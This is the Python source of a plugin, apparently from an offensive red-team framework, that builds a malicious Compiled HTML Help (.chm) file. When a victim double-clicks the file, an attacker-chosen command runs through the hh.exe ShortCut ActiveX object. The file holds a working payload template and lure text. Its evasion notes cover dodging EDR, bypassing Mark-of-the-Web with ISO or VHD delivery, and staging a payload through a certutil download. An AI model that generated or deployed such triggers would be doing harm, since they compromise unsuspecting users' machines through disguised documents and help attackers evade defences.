"""
Erebus Trigger - CHM (Compiled HTML Help) Plugin

Generates a CHM (Compiled HTML Help) trigger that auto-executes a command
when the victim double-clicks the .chm file. Execution flows through hh.exe
(Microsoft HTML Help executable - a signed Windows binary).

Process lineage:  explorer.exe → hh.exe → [command]

CHM execution mechanism:
    The CHM's default topic embeds a hhctrl.ocx ShortCut ActiveX object.
    On page load (body onload) the ShortCut Click() method fires, which
    causes hhctrl.ocx to execute the configured Item1 command via
    ShellExecute - equivalent to a LOLBin chain with no user macro prompts.

Build flow:
    1. Builder calls create_chm_project() → writes .hhp, .hhc, .html files
       to the payload directory.
    2. A build_chm.bat is included; on Windows, `hhc.exe` (bundled with every
       Windows SDK / HTML Help Workshop install) compiles the .chm.
    3. The Erebus.Helper `chm` subcommand handles the hhc.exe invocation when
       called from a Windows host.

OPSEC Notes:
    - hh.exe is a signed Microsoft binary - clean IAT, signed PE.
    - The ShortCut ActiveX method is well-known (T1218.001) and flagged by
      most EDRs on modern targets. Combine with obfuscated command or staging
      (e.g. rundll32 → load shellcode) rather than direct PowerShell.
    - Mark-of-the-Web: CHM files from the internet trigger Protected Mode.
      Deliver inside ISO/VHD (MOTW bypass) for reliable execution.
    - hhctrl.ocx ShortCut fires under the security zone of hh.exe; it does
      NOT inherit the browser's Protected Mode restrictions.

Reference:
    https://attack.mitre.org/techniques/T1218/001/
"""

import os
import textwrap
from pathlib import Path

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


# ---------------------------------------------------------------------------
# CHM project file templates
# ---------------------------------------------------------------------------

_HHP_TEMPLATE = """\
[OPTIONS]
Compatibility=1.1 or later
Compiled file={chm_name}
Contents file=toc.hhc
Default topic=default.html
Display compile progress=No
Full-text search=Yes
Language=0x409 English (United States)
Title={title}

[FILES]
default.html

[INFOTYPES]
"""

# Table of Contents - the ShortCut object lives here and fires via
# default.html's onload. The object must be present in the HHC for
# hhctrl.ocx to register it; the HTML page triggers it via JavaScript.
_HHC_TEMPLATE = """\
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
<HTML>
<HEAD>
<meta name="GENERATOR" content="Microsoft HTML Help Workshop 4.1">
</HEAD><BODY>
<OBJECT type="text/site properties">
    <param name="Window Styles" value="0x800025">
    <param name="ImageType" value="Folder">
</OBJECT>
<UL>
    <LI><OBJECT type="text/sitemap">
        <param name="Name" value="{title}">
        <param name="Local" value="default.html">
    </OBJECT>
</UL>
</BODY></HTML>
"""

# Default topic HTML - the ShortCut ActiveX fires on body onload.
# Item1 format: ,<executable>,<arguments>
# Leading comma means "no icon" - required by the ShortCut spec.
_HTML_TEMPLATE = """\
<!DOCTYPE html>
<html>
<head>
<title>{title}</title>
</head>
<body onload="window.x=document.getElementById('shortcut'); window.x.Click();">
<OBJECT id="shortcut"
    type="application/x-oleobject"
    classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11"
    codebase="hhctrl.ocx#version=4,74,8702,0">
    <PARAM name="Command" value="ShortCut">
    <PARAM name="Button"  value="Bitmap::shortcut">
    <PARAM name="Item1"   value=",{executable},{arguments}">
    <PARAM name="Item2"   value="273,1,1">
</OBJECT>
<p>{lure_text}</p>
</body>
</html>
"""

_BUILD_BAT_TEMPLATE = """\
@echo off
REM Compile CHM trigger using HTML Help Workshop (hhc.exe)
REM Run this on a Windows host with hhc.exe in PATH or in standard install location.
REM HTML Help Workshop: https://www.microsoft.com/en-us/download/details.aspx?id=21138

set HHC=
where hhc.exe >nul 2>&1 && set HHC=hhc.exe
if "%HHC%"=="" (
    if exist "C:\\Program Files (x86)\\HTML Help Workshop\\hhc.exe" (
        set HHC="C:\\Program Files (x86)\\HTML Help Workshop\\hhc.exe"
    )
)
if "%HHC%"=="" (
    echo [ERROR] hhc.exe not found. Install HTML Help Workshop.
    exit /b 1
)

echo [*] Compiling {chm_name}...
%HHC% project.hhp
if %errorlevel% EQU 0 (
    echo [+] CHM compiled successfully: {chm_name}
) else (
    echo [-] hhc.exe exited with code %errorlevel% - this is often success (hhc uses exit 1 on warn)
    if exist {chm_name} echo [+] Output file exists: {chm_name}
)
"""


class TriggerChmPlugin(ErebusPlugin):
    """CHM (Compiled HTML Help) trigger via hh.exe"""

    metadata = PluginMetadata(
        name="Trigger CHM",
        version="1.0.0",
        category=PluginCategory.TRIGGER,
        description="Generate a CHM trigger that auto-executes via hh.exe ShortCut ActiveX on double-click",
        author="Whispergate",
    )

    def get_metadata(self) -> PluginMetadata:
        return self.metadata

    def register(self):
        return {
            "create_chm_project": self.create_chm_project,
        }

    def validate(self) -> tuple:
        return (True, None)

    def on_load(self):
        pass

    def create_chm_project(
        self,
        executable: str,
        arguments: str,
        output_dir: str,
        chm_name: str = "document.chm",
        title: str = "Help Documentation",
        lure_text: str = "Loading help content...",
    ) -> Path:
        """Generate a CHM project directory ready for compilation.

        Creates the following files in output_dir:
            project.hhp    - HTML Help Project (controls hhc.exe compilation)
            toc.hhc        - Table of Contents
            default.html   - Default topic with ShortCut ActiveX payload
            build_chm.bat  - Windows batch file to compile with hhc.exe

        The CHM must be compiled on a Windows host via:
            hhc.exe project.hhp
        or via Erebus.Helper:
            python erebus_helper.py chm --project-dir <dir> --output document.chm

        Args:
            executable:  Executable path for ShortCut Item1
                         (e.g. "C:\\Windows\\System32\\rundll32.exe")
            arguments:   Arguments for Item1
                         (e.g. "payload.dll,EntryPoint")
            output_dir:  Directory where project files are written.
            chm_name:    Output .chm filename (default: document.chm).
            title:       CHM window title shown to the victim.
            lure_text:   Body text shown while the command executes.

        Returns:
            Path to the output directory containing the CHM project.

        OPSEC Notes:
            - [MALLEABLE] swap rundll32.exe for mshta.exe, wscript.exe,
              or regsvr32.exe to vary the child process signature.
            - ShortCut Item1 format: ,<exe>,<args>  (leading comma = no icon).
            - hhctrl.ocx ShortCut is well-signatured; consider staging:
              exe=cmd.exe args=/c certutil -urlcache -split -f http://... stage.bin
        """
        out = Path(output_dir)
        out.mkdir(parents=True, exist_ok=True)

        # Escape backslashes for HTML attribute context (not needed, but
        # forward-slash paths also work in Item1 on Windows).
        exe_attr = executable.replace("&", "&amp;").replace('"', "&quot;")
        args_attr = arguments.replace("&", "&amp;").replace('"', "&quot;")

        (out / "project.hhp").write_text(
            _HHP_TEMPLATE.format(chm_name=chm_name, title=title),
            encoding="utf-8",
        )
        (out / "toc.hhc").write_text(
            _HHC_TEMPLATE.format(title=title),
            encoding="utf-8",
        )
        (out / "default.html").write_text(
            _HTML_TEMPLATE.format(
                title=title,
                executable=exe_attr,
                arguments=args_attr,
                lure_text=lure_text,
            ),
            encoding="utf-8",
        )
        (out / "build_chm.bat").write_text(
            _BUILD_BAT_TEMPLATE.format(chm_name=chm_name),
            encoding="utf-8",
        )

        return out


if __name__ == "__main__":
    p = TriggerChmPlugin()
    valid, err = p.validate()
    print("[+] Validation passed" if valid else f"[-] Validation failed: {err}")
